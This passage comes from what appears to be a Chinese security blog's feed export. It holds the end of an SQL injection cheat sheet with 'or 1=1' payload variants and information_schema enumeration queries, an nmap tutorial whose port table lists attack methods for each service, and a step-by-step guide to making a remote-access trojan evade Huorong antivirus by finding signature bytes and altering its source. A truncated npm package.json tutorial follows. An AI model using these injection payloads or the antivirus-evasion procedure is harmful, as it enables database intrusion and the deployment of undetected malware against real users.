//连接数据库的用户名</p><p>Concat</p><p>Concat_ws</p><p>Group_concat</p><p>–+可以用#替换,url提交过程中Url编码后的#为%23 ‘是%27 空格%20</p><p>Or 1=1–+</p><p>‘ or 1=1–+</p><p>) or 1=1–+</p><p>‘) or 1=1–+</p><p>“) or 1=1–+</p><p>“)) or 1=1–+</p><p>Union 内部的select语句必须拥有相同数量的列。</p><p>Mysql关键的表 重点！！！</p><p>Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。</p><p>猜数据库</p><p>select schema_name from information_schema.schemata</p><p>schema_name是数据库名 information_schema.schemata存储了所有的数据库名字</p><p>猜某库的数据表</p><p>这个查询某个特定的表</p><p>select table_name from information_schema.tables where table_schema=’xxxxx’</p><p>要是这样select table_name from information_schema.tables就是查询所有的表</p><p>table_schema是数据库的名称，table_name是具体的表名 information_schema.tables存储了所有的表名</p><p>猜某表的所有列</p><p>这个查询某个特定的表</p><p>Select column_name from information_schema.columns where table_name=’xxxxx’</p><p>要是这样Select column_name from information_schema.columns就是查询所有的列</p><p>column_name是列名 table_name是表名 information_schema.columns存储了所有的列名</p><p>获取某列的内容</p><p>Select *** from ****</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap用法：</title>
      <link href="/2021/07/08/nmap-yong-fa/"/>
      <url>/2021/07/08/nmap-yong-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>NMAP是由GOrdon Lyon设计并实现的，于1997开始发布。最初设计NMAP的目的只是要打造一款强大的端口扫描工具。但随着时间的发展，NMAP的功能越来越全面，从简单的网络连接端口扫描工具变身成为全方位的安全和网络工具组件。<br>具备的主要功能：<br>1、主机发现端口扫描<br>2、服务和版本检测<br>3、操作系统检测<br>除了这些基本功能以外，NMAP还实现了一些高级审计功能，例如：我伪造发起端口扫描的身份，进行隐蔽扫描，对系统进行安全漏洞检测等….</p><h2 id="Nmap-典型用途："><a href="#Nmap-典型用途：" class="headerlink" title="Nmap&nbsp;典型用途："></a>Nmap&nbsp;典型用途：</h2><p>主机发现-识别网络上的主机。例如列出响应TCP和/或ICMP请求或打开特定端口的主机。<br>端口扫描&nbsp;-&nbsp;枚举目标主机上的开放端口。<br>版本检测&nbsp;-&nbsp;询问远程设备上的网络服务以确定应用程序名称和版本号。<br>OS检测&nbsp;-&nbsp;确定网络设备的操作系统和硬件特性。<br>软件版本检测脆弱性的漏洞（Nmap的脚本）</p><h2 id="Nmap常用扫描参数说明"><a href="#Nmap常用扫描参数说明" class="headerlink" title="Nmap常用扫描参数说明"></a>Nmap常用扫描参数说明</h2><p><img src="1.png"></p><h2 id="Nmap脚本分类"><a href="#Nmap脚本分类" class="headerlink" title="Nmap脚本分类"></a>Nmap脚本分类</h2><pre class="line-numbers language-js"><code class="language-js">auth<span class="token punctuation">:</span> 负责处理鉴权证书（绕开鉴权）的脚本  broadcast<span class="token punctuation">:</span> 在局域网内探查更多服务开启状况，如dhcp<span class="token operator">/</span>dns<span class="token operator">/</span>sqlserver等服务  brute<span class="token punctuation">:</span> 提供暴力破解方式，针对常见的应用如http<span class="token operator">/</span>snmp等  <span class="token keyword">default</span><span class="token punctuation">:</span> 使用<span class="token operator">-</span>sC或<span class="token operator">-</span>A选项扫描时候默认的脚本，提供基本脚本扫描能力  discovery<span class="token punctuation">:</span> 对网络进行更多的信息，如SMB枚举、SNMP查询等  dos<span class="token punctuation">:</span> 用于进行拒绝服务攻击  exploit<span class="token punctuation">:</span> 利用已知的漏洞入侵系统  external<span class="token punctuation">:</span> 利用第三方的数据库或资源，例如进行whois解析  fuzzer<span class="token punctuation">:</span> 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive<span class="token punctuation">:</span> 入侵性的脚本，此类脚本可能引发对方的IDS<span class="token operator">/</span>IPS的记录或屏蔽  malware<span class="token punctuation">:</span> 探测目标机是否感染了病毒、开启了后门等信息  safe<span class="token punctuation">:</span> 此类与intrusive相反，属于安全性脚本  version<span class="token punctuation">:</span> 负责增强服务与版本扫描（Version Detection）功能的脚本  vuln<span class="token punctuation">:</span> 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><pre class="line-numbers language-js"><code class="language-js">sP ：进行ping扫描 （打印出对ping扫描做出响应的主机<span class="token punctuation">,</span><span class="token function">不做进一步测试</span><span class="token punctuation">(</span>如端口扫描或者操作系统探测<span class="token punctuation">)</span>）nmap <span class="token operator">-</span>sP <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.0</span><span class="token operator">/</span><span class="token number">24</span>（这个命令可以用于探测局域网有哪些机器）<span class="token operator">-</span>sS ：半开放扫描（非<span class="token number">3</span>次握手的tcp扫描）使用频率最高的扫描选项：SYN扫描<span class="token punctuation">,</span>又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要<span class="token number">3</span>次握手，而<span class="token operator">-</span>sS选项不需要<span class="token number">3</span>次握手）优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高缺点：它需要root<span class="token operator">/</span>administrator权限执行nmap<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">-</span>sS<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">-</span>p <span class="token number">1</span><span class="token operator">-</span><span class="token number">65535</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span>   （扫描目标开放的所有端口<span class="token operator">-</span>半开式）sT：<span class="token number">3</span>次握手方式tcp的扫描优点：普通用户也可以使用。缺点：这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息，由于它要完成<span class="token number">3</span>次握手，效率低，速度慢，建议使用<span class="token operator">-</span>sS<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token function">sV：扫描目标地址开放服务</span><span class="token punctuation">(</span>端口<span class="token punctuation">)</span><span class="token function">版本</span><span class="token punctuation">(</span>sV<span class="token punctuation">)</span>版本检测是用来扫描目标主机和端口上运行的软件的版本，如下扫描，多出了ssh的版本信息<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>。nmap <span class="token operator">-</span>sV <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span><span class="token operator">-</span>O：扫描目标地址进行操作系统版本nmap<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">-</span>O<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span><span class="token operator">-</span>A：OS识别<span class="token punctuation">,</span>版本探测<span class="token punctuation">,</span>脚本扫描和综合扫描nmap <span class="token operator">-</span>A <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span><span class="token operator">-</span>Pn <span class="token operator">-</span>A 绕过防火墙进行全面扫描nmap <span class="token operator">-</span>Pn <span class="token operator">-</span>A <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Nmap脚本演示实例："><a href="#Nmap脚本演示实例：" class="headerlink" title="Nmap脚本演示实例："></a>Nmap脚本演示实例：</h3><pre class="line-numbers language-js"><code class="language-js">nmap <span class="token operator">--</span>script<span class="token operator">=</span>auth <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.26</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="2.png"></p><pre class="line-numbers language-js"><code class="language-js">nmap <span class="token operator">--</span>script<span class="token operator">=</span>vuln <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.26</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="3.png"></p><pre class="line-numbers language-js"><code class="language-js">nmap <span class="token operator">-</span>sS <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="4.png"></p><pre class="line-numbers language-js"><code class="language-js">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>p <span class="token number">1</span><span class="token operator">-</span><span class="token number">65535</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="5.png"></p><h3 id="本章节端口号扫描，在知道对方真实IP地址的实话可以尝试用端口扫描对对方进行扫描，对对方的子域名进行扫描。能扫到对方的系统类别，版本信息，等等一些信息。端口号开了那些服务也是信息收集很重要的一部分。"><a href="#本章节端口号扫描，在知道对方真实IP地址的实话可以尝试用端口扫描对对方进行扫描，对对方的子域名进行扫描。能扫到对方的系统类别，版本信息，等等一些信息。端口号开了那些服务也是信息收集很重要的一部分。" class="headerlink" title="本章节端口号扫描，在知道对方真实IP地址的实话可以尝试用端口扫描对对方进行扫描，对对方的子域名进行扫描。能扫到对方的系统类别，版本信息，等等一些信息。端口号开了那些服务也是信息收集很重要的一部分。"></a>本章节端口号扫描，在知道对方真实IP地址的实话可以尝试用端口扫描对对方进行扫描，对对方的子域名进行扫描。能扫到对方的系统类别，版本信息，等等一些信息。端口号开了那些服务也是信息收集很重要的一部分。</h3><p>端口号开了那些服务也是信息收集很重要的一部分。</p><h2 id="常见的端口信息及渗透方法"><a href="#常见的端口信息及渗透方法" class="headerlink" title="常见的端口信息及渗透方法"></a>常见的端口信息及渗透方法</h2><pre class="line-numbers language-js"><code class="language-js">    端口号      端口服务<span class="token operator">/</span>协议简要说明       关于端口可能的一些渗透用途 tcp <span class="token number">21</span>    ftp 默认的数据和命令传输端口<span class="token punctuation">[</span>可明文亦可加密传输<span class="token punctuation">]</span>  允许匿名的上传下载<span class="token punctuation">,</span>爆破<span class="token punctuation">,</span>嗅探<span class="token punctuation">,</span>win提权<span class="token punctuation">,</span><span class="token function">远程执行</span><span class="token punctuation">(</span>proftpd <span class="token number">1.3</span><span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">各类后门</span><span class="token punctuation">(</span>proftpd<span class="token punctuation">,</span>vsftp <span class="token number">2.3</span><span class="token punctuation">.</span><span class="token number">4</span><span class="token punctuation">)</span> tcp <span class="token number">22</span>    ssh<span class="token punctuation">[</span>数据ssl加密传输<span class="token punctuation">]</span>    可根据已搜集到的信息尝试爆破<span class="token punctuation">,</span>v1版本可中间人<span class="token punctuation">,</span>ssh隧道及内网代理转发<span class="token punctuation">,</span>文件传输<span class="token punctuation">,</span>等等…常用于linux远程管理…tcp <span class="token number">23</span>    telnet<span class="token punctuation">[</span>明文传输<span class="token punctuation">]</span>    爆破<span class="token punctuation">,</span>嗅探<span class="token punctuation">,</span>一般常用于路由<span class="token punctuation">,</span>交换登陆<span class="token punctuation">,</span>可尝试弱口令<span class="token punctuation">,</span>也许会有意想不到的收获 tcp <span class="token number">25</span>    smtp<span class="token punctuation">[</span>简单邮件传输协议<span class="token punctuation">,</span>多数linux发行版可能会默认开启此服务<span class="token punctuation">]</span>    邮件伪造<span class="token punctuation">,</span>vrfy<span class="token operator">/</span>expn 查询邮件用户信息<span class="token punctuation">,</span>可使用smtp<span class="token operator">-</span>user<span class="token operator">-</span><span class="token keyword">enum</span>工具来自动跑 tcp<span class="token operator">/</span>udp <span class="token number">53</span>    dns<span class="token punctuation">[</span>域名解析<span class="token punctuation">]</span>    允许区域传送<span class="token punctuation">,</span>dns劫持<span class="token punctuation">,</span>缓存投毒<span class="token punctuation">,</span>欺骗以及各种基于dns隧道的远控 tcp<span class="token operator">/</span>udp <span class="token number">69</span>    tftp<span class="token punctuation">[</span>简单文件传输协议<span class="token punctuation">,</span>无认证<span class="token punctuation">]</span>    尝试下载目标及其的各类重要配置文件 tcp <span class="token number">80</span><span class="token operator">-</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">,</span><span class="token number">8440</span><span class="token operator">-</span><span class="token number">8450</span><span class="token punctuation">,</span><span class="token number">8080</span><span class="token operator">-</span><span class="token number">8089</span>    web<span class="token punctuation">[</span>各种常用的web服务端口<span class="token punctuation">]</span>    各种常用web服务端口<span class="token punctuation">,</span>可尝试经典的top n<span class="token punctuation">,</span>vpn<span class="token punctuation">,</span>owa<span class="token punctuation">,</span>webmail<span class="token punctuation">,</span>目标oa<span class="token punctuation">,</span>各类java控制台<span class="token punctuation">,</span>各类服务器web管理面板<span class="token punctuation">,</span>各类web中间件漏洞利用<span class="token punctuation">,</span>各类web框架漏洞利用等等…… tcp <span class="token number">110</span>    <span class="token punctuation">[</span>邮局协议<span class="token punctuation">,</span>可明文可密文<span class="token punctuation">]</span>    可尝试爆破<span class="token punctuation">,</span>嗅探 tcp <span class="token number">137</span><span class="token punctuation">,</span><span class="token number">139</span><span class="token punctuation">,</span><span class="token number">445</span>    samba<span class="token punctuation">[</span>smb实现windows和linux间文件共享<span class="token punctuation">,</span>明文<span class="token punctuation">]</span>    可尝试爆破以及smb自身的各种远程执行类漏洞利用<span class="token punctuation">,</span>如<span class="token punctuation">,</span>ms08<span class="token number">-067</span><span class="token punctuation">,</span>ms17<span class="token number">-010</span><span class="token punctuation">,</span>嗅探等…… tcp <span class="token number">143</span>    imap<span class="token punctuation">[</span>可明文可密文<span class="token punctuation">]</span>    可尝试爆破 udp <span class="token number">161</span>    snmp<span class="token punctuation">[</span>明文<span class="token punctuation">]</span>    爆破默认团队字符串<span class="token punctuation">,</span>搜集目标内网信息 tcp <span class="token number">389</span>    ldap<span class="token punctuation">[</span>轻量级目录访问协议<span class="token punctuation">]</span>    ldap注入<span class="token punctuation">,</span>允许匿名访问<span class="token punctuation">,</span>弱口令 tcp <span class="token number">512</span><span class="token punctuation">,</span><span class="token number">513</span><span class="token punctuation">,</span><span class="token number">514</span>    linux rexec    可爆破<span class="token punctuation">,</span>rlogin登陆 tcp <span class="token number">873</span>    rsync备份服务    匿名访问<span class="token punctuation">,</span>文件上传 tcp <span class="token number">1194</span>    openvpn    想办法钓vpn账号<span class="token punctuation">,</span>进内网 tcp <span class="token number">1352</span>    Lotus domino邮件服务    弱口令<span class="token punctuation">,</span>信息泄漏<span class="token punctuation">,</span>爆破 tcp <span class="token number">1433</span>    mssql数据库    注入<span class="token punctuation">,</span>提权<span class="token punctuation">,</span>sa弱口令<span class="token punctuation">,</span>爆破 tcp <span class="token number">1521</span>    oracle数据库    tns爆破<span class="token punctuation">,</span>注入<span class="token punctuation">,</span>弹shell… tcp <span class="token number">1500</span>    ispmanager 主机控制面板    弱口令 tcp <span class="token number">1025</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">2049</span>    nfs    权限配置不当 tcp <span class="token number">1723</span>    pptp    爆破<span class="token punctuation">,</span>想办法钓vpn账号<span class="token punctuation">,</span>进内网 tcp <span class="token number">2082</span><span class="token punctuation">,</span><span class="token number">2083</span>    cpanel主机管理面板登录    弱口令 tcp <span class="token number">2181</span>    zookeeper    未授权访问 tcp <span class="token number">2601</span><span class="token punctuation">,</span><span class="token number">2604</span>    zebra路由    默认密码zerbra tcp <span class="token number">3128</span>    squid代理服务    弱口令 tcp <span class="token number">3312</span><span class="token punctuation">,</span><span class="token number">3311</span>    kangle主机管理登录    弱口令 tcp <span class="token number">3306</span>    mysql数据库    注入<span class="token punctuation">,</span>提权<span class="token punctuation">,</span>爆破 tcp <span class="token number">3389</span>    windows rdp远程桌面    shift后门<span class="token punctuation">,</span>爆破<span class="token punctuation">,</span>ms12<span class="token number">-020</span><span class="token punctuation">[</span>蓝屏exp<span class="token punctuation">]</span> tcp <span class="token number">4848</span>    glassfish控制台    弱口令 tcp <span class="token number">4899</span>    radmin远程桌面管理工具<span class="token punctuation">,</span> 抓密码拓展机器 tcp <span class="token number">5000</span>    sybase<span class="token operator">/</span>DB2数据库    爆破<span class="token punctuation">,</span>注入 tcp <span class="token number">5432</span>    postgresql数据库    爆破<span class="token punctuation">,</span>注入<span class="token punctuation">,</span>弱口令 tcp <span class="token number">5632</span>    pcanywhere远程桌面管理工具    抓密码<span class="token punctuation">,</span>代码执行tcp <span class="token number">5900</span><span class="token punctuation">,</span><span class="token number">5901</span><span class="token punctuation">,</span><span class="token number">5902</span>    vnc远程桌面管理工具    弱口令爆破<span class="token punctuation">,</span>如果信息搜集不到位<span class="token punctuation">,</span>成功几率很小 tcp <span class="token number">5984</span>    CouchDB    未授权导致的任意指令执行 tcp <span class="token number">6379</span>    redis未授权    可尝试未授权访问<span class="token punctuation">,</span>弱口令爆破 tcp <span class="token number">7001</span><span class="token punctuation">,</span><span class="token number">7002</span>    weblogic控制台    java反序列化<span class="token punctuation">,</span>弱口令 tcp <span class="token number">7778</span>    kloxo    主机面板登录 tcp <span class="token number">8000</span>    Ajenti主机控制面板    弱口令 tcp <span class="token number">8443</span>    plesk主机控制面板    弱口令 tcp <span class="token number">8069</span>    zabbix    远程执行<span class="token punctuation">,</span>sql注入 tcp <span class="token number">8080</span><span class="token operator">-</span><span class="token number">8089</span>    Jenkins<span class="token punctuation">,</span>jboss    反序列化<span class="token punctuation">,</span>控制台弱口令 tcp <span class="token number">9080</span><span class="token operator">-</span><span class="token number">9081</span><span class="token punctuation">,</span><span class="token number">9090</span>    websphere控制台    java反序列化<span class="token operator">/</span>弱口令 tcp <span class="token number">9200</span><span class="token punctuation">,</span><span class="token number">9300</span>    elasticsearch    远程执行 tcp <span class="token number">10000</span>    webmin linux主机web控制面板入口    弱口令 tcp <span class="token number">11211</span>    memcached    未授权访问 tcp <span class="token number">27017</span><span class="token punctuation">,</span><span class="token number">27018</span>    mongodb    爆破<span class="token punctuation">,</span>未授权访问 tcp <span class="token number">3690</span>    svn服务    svn泄露<span class="token punctuation">,</span>未授权访问 tcp <span class="token number">50000</span>    SAP Management Console    远程执行 tcp <span class="token number">50070</span><span class="token punctuation">,</span><span class="token number">50030</span>    hadoop    默认端口未授权访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过火绒静态免杀</title>
      <link href="/2021/07/08/guo-huo-rong-mian-sha/"/>
      <url>/2021/07/08/guo-huo-rong-mian-sha/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在研究  <code>免杀</code> 内的问题，碰到一些相关问题，算是整理一下。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>远控源代码免杀过火绒，基于国内的杀毒软件的<code>特征检查</code>，大多数都是用的<code>特征库</code>类的去检查。</p><p><code>360</code>的云引擎比较厉害，感觉<code>火绒</code>有点low。</p><h3 id="杀毒原理解析"><a href="#杀毒原理解析" class="headerlink" title="杀毒原理解析"></a>杀毒原理解析</h3><p>国内比较出名的有<code>360</code>、<code>腾讯电脑管家</code>、<code>火绒</code>、<code>金山毒霸</code>、<code>瑞星</code>等等，这几个杀毒软件，国内大多数应该都是<code>火绒</code>和<code>360</code></p><p>国外的比较出名的<code>火眼</code>，<code>诺顿</code>，<code>卡巴</code>，<code>微软</code>自带的那个，</p><p>现在的杀毒软件都无法脱离三个部分，<code>扫描器</code>、<code>病毒库</code>、<code>虚拟机</code>。</p><p>然而一个杀毒软件做的是否好用，最主要的还是扫描器的速度、准确率以及病毒库是否庞大。</p><h3 id="基于特征码的静态扫描技术"><a href="#基于特征码的静态扫描技术" class="headerlink" title="基于特征码的静态扫描技术"></a>基于特征码的静态扫描技术</h3><p>这种技术很容易被人想到，所以第一代的杀毒软件出现了，他们的杀毒思想就是，</p><p>我只要在特征库中匹配到已知的病毒特征字符串（一般都是 <code>MD5值</code> ）就可以判断出来这个文件是一个病毒。</p><p>但这种方法在当今病毒技术迅猛发展的形势下已经起不到很好的作用了。不好用就是已经过时了 <code>火绒</code>就是</p><p>用的这种技术。</p><h3 id="基于特征码的云引擎查杀技术"><a href="#基于特征码的云引擎查杀技术" class="headerlink" title="基于特征码的云引擎查杀技术"></a>基于特征码的云引擎查杀技术</h3><p>国内 <code>360</code> 的云引擎查杀不得不说是真的厉害。 <code>云引擎</code>查杀，顾名思义就是扫描一个文件，带入到云端去扫描</p><p>360属于驱动级别的查杀，驱动级别简单理解：打个比方，你电脑中安装了360，它会监控你整个电脑的所有程序，</p><p>你的任务管理器里面的所有程序，包括程序后面续执行所有危险的操作，它都会监控。我记得以前打游戏的时候，</p><p>启动游戏360会自动进入一个游戏模式，360在平时会很占你的内存，因为360也会监控内存。</p><p>360 能检测驱动程序，内存，可执行程序。基本上360能监测很多了，它是基于云引擎查杀的，而火绒是基于特征库</p><p>监测的。</p><h3 id="我所认知能拿shell的木马"><a href="#我所认知能拿shell的木马" class="headerlink" title="我所认知能拿shell的木马"></a>我所认知能拿shell的木马</h3><p>个人现在所知道能拿shell的木马可分为：<code>网马</code>、<code>驱动马</code>、<code>内存马</code>、<code>可执行程序马</code>、</p><p><code>网马</code>：<code>网马</code>就是上传到web服务器里面，主要以拿到webshell。</p><p><code>驱动马</code>：听名字应该知道它的意思。简单理解就是，你的电脑启动的时候会启动驱动程序，而别人在你的驱动里面植入了木马，你启动电脑的时候，木马也会自动运行。</p><p><code>内存马</code>：内存马原理大概上跟驱动马类似</p><p><code>可执行程序马</code>：在你启动，或者点开执行一个程序的时候，它才回运行。一般来说你只要不点开它就没事儿。</p><p><code>木马</code>其实就是执行一些<code>高危</code>的操作，或者是执行一些<code>高危</code>的权限的程序，木马在执行的时候会触<code>发行为特征</code>，本偏介绍的<br>就是如何过<code>火绒免杀</code>。</p><h3 id="远控源码免杀"><a href="#远控源码免杀" class="headerlink" title="远控源码免杀"></a>远控源码免杀</h3><h4 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h4><p>先生成一个木马.<br><img src="1.png"></p><h4 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h4><p>查看查杀情况.可以看到报了风险详情.<br><img src="2.png"></p><h4 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h4><p>下面来进行免杀.<br>fuck.dat 是远控生成木马的文件，把.dat免杀了，文件下面生成的所有小马都会免杀。<br>点开工具导入.dat文件，分块数量修改掉，点生成。<br><img src="3.png"></p><h4 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h4><p>在文件夹中会有生成的20个文件，把它全部选中，右键查杀。<br><img src="4.png"></p><h4 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h4><p>会发现有三个风险，给它处理掉。说明有三个是有木马特征的<br><img src="5.png"></p><h4 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h4><p>点击二次处理，会在生成20个文件，然后再右键查杀会发现，未发现风险。说明这20个文件里面是没有特征的<br><img src="6.png"></p><h4 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h4><p>特征区间会显示一个特征，但是这个不是他真实的特征。因为我们要定位到它后面的两位数或者三位数<br><img src="7.png"></p><h4 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h4><p>右键复合定位，分块数量还是改成20，不然会生成很多个，不好定位。<br><img src="8.png"></p><h4 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h4><p>复合定位后会生成后，还是一样接着在文件夹中查杀。在点击二次处理，一直二次处理，直到查不出来。<br><img src="9.png"></p><h4 id="0x2x1"><a href="#0x2x1" class="headerlink" title="0x2x1"></a>0x2x1</h4><p>特征区间会出现两个特征码，接着复合定位。接着改成生成20，然后在查杀，在二次处理，直到查不出来。<br><img src="10.png"></p><h4 id="0x2x2"><a href="#0x2x2" class="headerlink" title="0x2x2"></a>0x2x2</h4><p>一直复合定位，生成，查杀，二次处理，查杀。复合定位，生成，查杀，二次处理，查杀<br>直到查杀不出来，特征区间的特征码为002结尾，长度为2。  这个就是我们查杀出来的特征码<br>保存下来。<br><img src="11.png"></p><h4 id="0x2x3"><a href="#0x2x3" class="headerlink" title="0x2x3"></a>0x2x3</h4><p>打开C32Asm，把.dat文件导入进去，辅助我们查找，输入刚才查到的两个特征码，看查杀的哪些地方。<br><img src="12.png"><br><img src="13.png"></p><h4 id="0x2x4"><a href="#0x2x4" class="headerlink" title="0x2x4"></a>0x2x4</h4><p>把.dsw文件导入vc中，应为这款远控是c++写的，我们导入的这个文件，它是这款程序生服务端和客户端的源文件，<br>查找ServerDll，因为我们特征定位是查出来这两个位置被杀了。直接查找<br><img src="14.png"></p><h4 id="0x2x5"><a href="#0x2x5" class="headerlink" title="0x2x5"></a>0x2x5</h4><p>在vc中查找刚才我们被杀的两个地方。<br><img src="15.png"><br><img src="16.png"></p><h4 id="0x2x6"><a href="#0x2x6" class="headerlink" title="0x2x6"></a>0x2x6</h4><p>第一个改掉相关的关键字，第二个直接注释掉，没什么用的鸡肋功能。<br><img src="18.png"><br><img src="19.png"></p><h4 id="0x2x7"><a href="#0x2x7" class="headerlink" title="0x2x7"></a>0x2x7</h4><p>最终版本，加上线。<br><img src="20.png"><br><img src="21.png"></p>]]></content>
      
      
      <categories>
          
          <category> -免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm,看这篇就够了</title>
      <link href="/2020/02/29/npm-kan-zhe-pian-jiu-gou-liao/"/>
      <url>/2020/02/29/npm-kan-zhe-pian-jiu-gou-liao/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在研究  <code>npm</code> 组件发布，碰到一些相关问题，算是整理一下。</p><h3 id="涉及内容"><a href="#涉及内容" class="headerlink" title="涉及内容"></a>涉及内容</h3><ul><li>package.json 文件介绍</li><li>.npmrc 的作用及配置</li><li>公网 npm 组件发布</li></ul><h2 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>package.json 定义了当前项目中 <code>npm包</code> 之间的依赖关系和项目的一些配置信息（项目名称，版本，描述，开发人，许可证 等等）。</p><p>当说到包管理器，就会遇到 <code>yarn</code> 和 <code>npm</code> 的选择性问题。我是喜欢用 <code>yarn</code><br>的，看看 <code>github</code> 上的开源项目，比如 <code>vue</code> 项目下就有 <code>yarn.lock</code> 文件，由此我猜测 <code>yarn</code> 可能更受欢迎一些，日常使用中我也是 <code>yarn</code> 用的比较多。 </p><p>当我们 <code>npm install</code> 或 <code>yarn install</code> 会根据项目下的 <code>package.json</code> 解析依赖包之间的依赖关系然后从配置的 <code>npm registry</code> （ <code>.npmrc</code> 可以配置对应的 <code>registry</code>）地址中搜索并下载包。</p><p>我们可以在 <code>yarn.lock</code> 或 <code>package-lock.json</code> 看到包从哪里下载和依赖关系。</p><p>提交代码的时候排除 <code>node_modules</code> 目录，但是要提交 <code>yarn.lock</code> 或 <code>package-lock.json</code> ,用于锁定项目依赖包的版本。并且升级包的时候不要手动改 <code>package.json</code> 中的版本号，要使用命令 <code>yarn upgrade</code> 或 <code>npm upgrade </code> 升级。</p><p><code>npm init</code> 或 <code>yarn init</code> 可以生成 package.json。</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"@mflyyou/npm-description"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.0"</span><span class="token punctuation">,</span>    <span class="token property">"private"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">"jadelin"</span><span class="token punctuation">,</span>    <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"MIT"</span><span class="token punctuation">,</span>    <span class="token property">"main"</span><span class="token operator">:</span><span class="token string">"index.js"</span><span class="token punctuation">,</span>    <span class="token property">"keywords"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"npm 搜索关键词"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"publishConfig"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        